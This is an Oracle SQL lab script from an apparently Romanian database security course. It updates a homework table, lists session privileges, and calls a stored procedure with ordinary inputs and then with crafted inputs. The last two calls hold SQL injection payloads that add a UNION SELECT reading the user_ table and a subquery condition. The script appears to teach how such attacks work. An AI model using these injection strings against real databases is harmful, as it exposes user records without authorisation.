/**************   Laborator 5   **************/
SET SERVEROUTPUT ON;
SET ECHO OFF;
SET VERIFY OFF;



/*** Ex1 ***/
update elearn_app_admin.solves 
set upload_date = sysdate 
where homework_id = 2;
-- mai elegant: execute elearn_app_admin_sla.proc_marking(1, 2, 3, 10);



/*** Ex2 ***/
select * from session_privs;
select * from session_roles;
select * from user_tab_privs;
select * from user_col_privs;

-- Execuție Onestă
execute elearn_app_admin.find_dangers('2023');
execute elearn_app_admin.find_dangers('01-2023');

-- Execuție Neonestă (Injecție)
execute elearn_app_admin.find_dangers('01-2023%'' union select 99 as id_homework, id as id_stud, date_in, 99 as grade, 99 as id_corrector from user_ where username like ''' );
execute elearn_app_admin.find_dangers('2023%'' and student_id in (select id from student where resume_studies = 1) and ''AAA'' like ''');